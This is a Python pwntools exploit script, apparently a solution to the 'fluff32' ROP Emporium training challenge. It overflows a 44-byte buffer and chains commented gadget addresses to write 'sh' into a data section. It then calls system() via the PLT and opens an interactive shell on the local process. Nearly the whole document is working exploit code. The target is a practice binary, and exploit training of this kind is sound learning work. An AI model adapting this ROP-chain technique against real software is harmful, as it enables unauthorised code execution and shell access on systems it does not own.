#!/usr/bin/python

import os 
from pwn import *

elf = ELF('./fluff32')

instruction = "sh\x00\x00"
null = p32(0)
f = p32(0xffffffff)
data = p32(0x0804a029)
rop0 = p32(0x08048693)					#mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
rop1 = p32(0x08048671)					#xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
rop2 = p32(0x0804867b)					#xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
rop3 = p32(0x08048689)					#xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
rop4 = p32(0x080483e1)					#pop ebx; ret;

payload = "A"*44

for i in range(0, 2):
    payload += rop1 + f + rop4
    if i == 0:
        payload += data + rop2 + f + rop3 + f
    else: 
        payload += instruction + rop2 + f     

print payload
payload += rop0 + f + null      
payload += p32(elf.plt['system']) + "BBBB" + data

r = process('./fluff32')

r.recvuntil('>')
r.sendline(payload)
r.interactive()
 